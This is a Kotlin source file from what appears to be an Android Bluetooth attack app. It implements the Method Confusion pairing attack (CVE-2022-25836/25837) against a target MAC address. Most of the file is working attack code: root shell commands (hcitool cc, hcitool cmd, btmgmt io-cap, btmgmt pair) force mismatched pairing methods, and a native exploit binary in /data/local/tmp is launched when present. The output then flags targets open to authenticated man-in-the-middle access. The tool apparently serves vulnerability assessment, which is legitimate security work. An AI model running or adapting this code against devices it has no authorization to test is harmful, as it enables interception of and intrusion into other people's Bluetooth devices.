package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Modes of operation for the Method Confusion attack (CVE-2022-25836, CVE-2022-25837).
 *
 * Each mode targets a different mismatch in pairing method negotiation between
 * two devices. The attack exploits the fact that BR/EDR SSP and BLE SMP allow
 * the two endpoints to interpret the same pairing exchange under different
 * authentication methods, enabling authenticated MITM even in the highest
 * security mode.
 *
 * Source: von Tschirschnitz et al., "Method Confusion Attack on Bluetooth
 * Pairing" (IEEE S&P 2023).
 */
enum class ConfusionMode(val description: String) {
    PASSKEY_VS_NUMERIC(
        "Force one side into Passkey Entry while the other uses Numeric Comparison"
    ),
    JUST_WORKS_VS_PASSKEY(
        "Force one side into Just Works while the other expects Passkey Entry"
    ),
    OOB_VS_NUMERIC(
        "Force one side into OOB pairing while the other uses Numeric Comparison"
    )
}

/**
 * Implementation of the Method Confusion attack on Bluetooth pairing.
 *
 * This module targets the pairing method negotiation in both BR/EDR (SSP) and
 * BLE (SMP). Method Confusion exploits the lack of a cryptographic binding
 * between the chosen key establishment method and the pairing protocol
 * exchange, allowing a MITM attacker to manipulate two pairing devices into
 * using conflicting methods. This enables authenticated MITM even when both
 * devices support Secure Connections.
 *
 * CVE-2022-25836 covers the BLE (SMP) variant; CVE-2022-25837 covers the
 * BR/EDR (SSP) variant.
 *
 * The module first checks for a dedicated native binary (`method_confusion`).
 * If that binary is not present, it falls back to hcitool/btmgmt to read IO
 * capabilities of the target, check SSP/SC support, attempt to force a pairing
 * method mismatch via HCI commands, and analyze the negotiated method versus
 * the expected method.
 *
 * Root is required for all approaches (HCI-level manipulation).
 * All privileged operations are executed through [RootExecutor].
 */
class MethodConfusionModule {

    companion object {
        private const val TAG = "MethodConfusionModule"
        private const val METHOD_CONFUSION_BINARY_PATH = "/data/local/tmp/method_confusion"
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the Method Confusion attack workflow against the target device.
     *
     * The flow:
     * 1. Verify root access (required, no simulation fallback)
     * 2. Check if the native method_confusion binary exists
     * 3. If it exists, run it with the specified mode
     * 4. Otherwise, use hcitool/btmgmt to probe IO capabilities and attempt
     *    to force a pairing method mismatch
     *
     * @param targetDevice The Bluetooth device to attack.
     * @param mode The specific confusion variation to use.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice, mode: ConfusionMode): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting Method Confusion attack (CVE-2022-25836/25837) on " +
                "${targetDevice.name ?: mac} using mode $mode")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("Method Confusion requires root for HCI-level manipulation. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $METHOD_CONFUSION_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native method_confusion binary
            emit("Native method_confusion binary found at $METHOD_CONFUSION_BINARY_PATH")
            emit("Executing: $METHOD_CONFUSION_BINARY_PATH -t $mac -m ${mode.name}")

            val output = RootExecutor.execute(
                "$METHOD_CONFUSION_BINARY_PATH -t $mac -m ${mode.name}"
            )
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("method_confusion execution failed.")
            } else {
                emit("method_confusion execution completed.")
            }
        } else {
            // Fallback: use hcitool/btmgmt to probe and attempt method mismatch
            emit("Native binary not found at $METHOD_CONFUSION_BINARY_PATH")
            emit("Falling back to hcitool/btmgmt-based IO capability probing...")

            executeHcitoolApproach(mac, mode)
        }
    }

    /**
     * Uses hcitool and btmgmt to read the target's IO capabilities, check SSP
     * and Secure Connections support, attempt to force a pairing method mismatch
     * via HCI commands, and analyze whether the negotiated method differs from
     * the expected method.
     *
     * Steps:
     *   1. Read remote IO capabilities via HCI Read Remote OOB Data / features.
     *   2. Check SSP and Secure Connections support in remote features.
     *   3. Attempt to force a pairing method mismatch by setting local IO
     *      capability to conflict with the target's expected method.
     *   4. Trigger pairing and capture the negotiated method.
     *   5. Compare negotiated method vs expected method for the given mode.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
        mac: String,
        mode: ConfusionMode
    ) {
        // Step 1: Create ACL connection to the target
        emit("Creating ACL connection to $mac...")
        val ccResult = RootExecutor.execute("hcitool cc $mac")
        if (ccResult.startsWith("Error")) {
            emit("Failed to create ACL connection: $ccResult")
            emit("The target may be out of range, unpaired, or not accepting connections.")
            return
        }
        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")

        // Step 2: Read remote IO capabilities
        emit("Reading remote IO capabilities...")
        val ioCapResult = readRemoteIoCapabilities(mac)
        emit("Remote IO capabilities: $ioCapResult")

        // Step 3: Check SSP and Secure Connections support
        emit("Checking SSP and Secure Connections support...")
        checkSspAndScSupport(mac)

        // Step 4: Attempt to force pairing method mismatch
        emit("--- Attempting method confusion (mode: ${mode.name}) ---")
        attemptMethodMismatch(mac, mode, ioCapResult)

        // Step 5: Analyze the result
        emit("--- Analysis complete ---")
    }

    /**
     * Reads the remote device's IO capabilities by querying extended features
     * and using btmgmt info to determine what pairing methods the target
     * supports.
     *
     * @return A human-readable string describing the detected IO capability.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.readRemoteIoCapabilities(
        mac: String
    ): String {
        // Read Remote Supported Features (HCI command 0x04 0x001B with connection handle)
        val infoResult = RootExecutor.execute("hcitool info $mac")
        for (line in infoResult.lines()) {
            if (line.isNotBlank()) {
                emit("  info: $line")
            }
        }

        // Parse IO capability from the info output
        val upper = infoResult.uppercase()
        return when {
            upper.contains("DISPLAYYESNO") || upper.contains("DISPLAY YES/NO") ->
                "DisplayYesNo"
            upper.contains("DISPLAYONLY") || upper.contains("DISPLAY ONLY") ->
                "DisplayOnly"
            upper.contains("KEYBOARDONLY") || upper.contains("KEYBOARD ONLY") ->
                "KeyboardOnly"
            upper.contains("KEYBOARDDISPLAY") || upper.contains("KEYBOARD DISPLAY") ->
                "KeyboardDisplay"
            upper.contains("NOINPUTNOOUTPUT") || upper.contains("NO INPUT NO OUTPUT") ->
                "NoInputNoOutput"
            else -> "Unknown (manual analysis required)"
        }
    }

    /**
     * Checks whether the remote device supports Secure Simple Pairing (SSP)
     * and Secure Connections (SC) by reading remote extended features.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.checkSspAndScSupport(
        mac: String
    ) {
        // Read Local Supported Features to check SSP host support
        val localFeatures = RootExecutor.execute("hcitool cmd 0x04 0x0003")
        emit("Local supported features: ${localFeatures.ifBlank { "(empty)" }}")

        val localUpper = localFeatures.uppercase()
        val localSsp = localUpper.contains("SSP") ||
                localUpper.contains("SECURE SIMPLE PAIRING")
        emit("Local SSP support: ${if (localSsp) "detected" else "not detected in output"}")

        // Read Remote Extended Features for SC support
        val remoteFeatures = RootExecutor.execute("hcitool cmd 0x04 0x001C")
        emit("Remote extended features: ${remoteFeatures.ifBlank { "(empty)" }}")

        val remoteUpper = remoteFeatures.uppercase()
        val remoteSc = remoteUpper.contains("SC") ||
                remoteUpper.contains("SECURE CONNECTIONS") ||
                remoteUpper.contains("SECURE CONNECTION")
        emit("Remote Secure Connections support: ${if (remoteSc) "detected" else "not detected in output"}")

        if (remoteSc) {
            emit("Target supports Secure Connections. Method Confusion can still " +
                    "enable authenticated MITM by exploiting the lack of method " +
                    "binding in the pairing protocol.")
        } else {
            emit("Target does not appear to support Secure Connections. " +
                    "Legacy pairing may be in use, which has weaker MITM protections.")
        }
    }

    /**
     * Attempts to force a pairing method mismatch by setting the local IO
     * capability to conflict with what the target expects, then triggering
     * pairing and analyzing the result.
     *
     * The [ConfusionMode] determines which local IO capability is set:
     *   - PASSKEY_VS_NUMERIC: Set local to KeyboardOnly (forces Passkey Entry
     *     on our side) while the target expects Numeric Comparison.
     *   - JUST_WORKS_VS_PASSKEY: Set local to NoInputNoOutput (forces Just Works)
     *     while the target expects Passkey Entry.
     *   - OOB_VS_NUMERIC: Advertise OOB data availability while the target
     *     expects Numeric Comparison.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.attemptMethodMismatch(
        mac: String,
        mode: ConfusionMode,
        remoteIoCap: String
    ) {
        // Determine the local IO capability to set based on confusion mode
        val (localIoCap, localIoCapCode, expectedLocalMethod, expectedRemoteMethod) = when (mode) {
            ConfusionMode.PASSKEY_VS_NUMERIC -> {
                emit("Strategy: Set local IO to KeyboardOnly to force Passkey Entry " +
                        "while remote expects Numeric Comparison.")
                MethodMismatchParams(
                    "KeyboardOnly", "0x02",
                    "Passkey Entry", "Numeric Comparison"
                )
            }
            ConfusionMode.JUST_WORKS_VS_PASSKEY -> {
                emit("Strategy: Set local IO to NoInputNoOutput to force Just Works " +
                        "while remote expects Passkey Entry.")
                MethodMismatchParams(
                    "NoInputNoOutput", "0x03",
                    "Just Works", "Passkey Entry"
                )
            }
            ConfusionMode.OOB_VS_NUMERIC -> {
                emit("Strategy: Advertise OOB data availability to force OOB pairing " +
                        "while remote expects Numeric Comparison.")
                MethodMismatchParams(
                    "OOB", "0x00",
                    "OOB", "Numeric Comparison"
                )
            }
        }

        // Set local IO capability via btmgmt
        emit("Setting local IO capability to $localIoCap (code $localIoCapCode)...")
        val ioSetResult = RootExecutor.execute("btmgmt io-cap $localIoCapCode")
        if (ioSetResult.startsWith("Error")) {
            emit("Failed to set IO capability: $ioSetResult")
            emit("Trying alternative: hcitool cmd to write IO capability...")
            // Write Simple Pairing Mode + IO Capability via HCI
            val hciResult = RootExecutor.execute(
                "hcitool cmd 0x03 0x0056 $localIoCapCode"
            )
            emit("HCI write IO capability result: ${hciResult.ifBlank { "(empty)" }}")
        } else {
            emit("IO capability set: ${ioSetResult.ifBlank { "OK" }}")
        }

        // Trigger pairing
        emit("Triggering pairing with $mac...")
        val pairResult = RootExecutor.execute("btmgmt pair -c 3 $mac")
        for (line in pairResult.lines()) {
            if (line.isNotBlank()) {
                emit("  pair: $line")
            }
        }

        // Analyze the negotiated method
        emit("")
        emit("=== Method Confusion Analysis ===")
        emit("Remote IO capability: $remoteIoCap")
        emit("Local IO capability set to: $localIoCap")
        emit("Expected local method: $expectedLocalMethod")
        emit("Expected remote method: $expectedRemoteMethod")

        analyzeNegotiatedMethod(pairResult, mode, expectedLocalMethod, expectedRemoteMethod, mac)

        // Cleanup: restore default IO capability (DisplayYesNo = 0x01)
        emit("")
        emit("Restoring default IO capability (DisplayYesNo)...")
        val restoreResult = RootExecutor.execute("btmgmt io-cap 0x01")
        emit("IO capability restore: ${restoreResult.ifBlank { "OK" }}")

        // Unpair the test bond if one was created
        emit("Cleaning up test bond...")
        val unpairResult = RootExecutor.execute("btmgmt unpair $mac")
        emit("Unpair result: ${unpairResult.ifBlank { "OK" }}")
    }

    /**
     * Analyzes the pairing output to determine whether a method confusion
     * occurred -- i.e., the negotiated method differs from what both sides
     * should have agreed upon given their IO capabilities.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.analyzeNegotiatedMethod(
        pairOutput: String,
        mode: ConfusionMode,
        expectedLocal: String,
        expectedRemote: String,
        mac: String
    ) {
        val upper = pairOutput.uppercase()

        val negotiatedMethod = when {
            upper.contains("PASSKEY") || upper.contains("PIN") -> "Passkey Entry"
            upper.contains("NUMERIC COMPARISON") || upper.contains("CONFIRM") -> "Numeric Comparison"
            upper.contains("JUST WORKS") -> "Just Works"
            upper.contains("OOB") -> "Out-of-Band"
            upper.contains("PAIRED") || upper.contains("SUCCESS") -> "Pairing succeeded (method undetermined)"
            upper.contains("REJECTED") || upper.contains("DENIED") -> "Pairing rejected by target"
            upper.contains("TIMEOUT") || upper.contains("TIMED OUT") -> "Pairing timed out"
            upper.contains("FAILED") -> "Pairing failed"
            else -> "Inconclusive"
        }

        emit("Negotiated method: $negotiatedMethod")

        when {
            negotiatedMethod == "Pairing rejected by target" -> {
                emit("Target rejected the pairing attempt.")
                emit("The target may enforce strict IO capability matching, which " +
                        "mitigates Method Confusion.")
            }
            negotiatedMethod == "Pairing timed out" -> {
                emit("Pairing timed out. Target may be out of range or not responding.")
            }
            negotiatedMethod == "Pairing failed" -> {
                emit("Pairing failed. The target may have detected the IO capability " +
                        "mismatch or does not support the forced method.")
            }
            negotiatedMethod.contains("succeeded") || negotiatedMethod == expectedLocal -> {
                emit("POTENTIAL VULNERABILITY: Pairing completed with method mismatch.")
                emit("The local side used $expectedLocal while the remote side " +
                        "expected $expectedRemote.")
                emit("This indicates the target may be susceptible to Method Confusion " +
                        "(CVE-2022-25836/25837).")
                emit("An attacker in a MITM position could exploit this to achieve " +
                        "authenticated man-in-the-middle access.")
                Log.w(TAG, "Method Confusion potential vulnerability on $mac: " +
                        "mode=${mode.name}, negotiated=$negotiatedMethod")
            }
            negotiatedMethod == expectedRemote -> {
                emit("Target enforced its expected method ($expectedRemote).")
                emit("No method confusion detected for mode ${mode.name}.")
                emit("The target correctly negotiated its preferred authentication method.")
            }
            else -> {
                emit("Result is inconclusive. The negotiated method ($negotiatedMethod) " +
                        "does not clearly match either expected outcome.")
                emit("Manual analysis of HCI logs is recommended for a definitive assessment.")
            }
        }
    }

    /**
     * Internal data class for method mismatch parameters.
     */
    private data class MethodMismatchParams(
        val localIoCap: String,
        val localIoCapCode: String,
        val expectedLocalMethod: String,
        val expectedRemoteMethod: String
    )
}
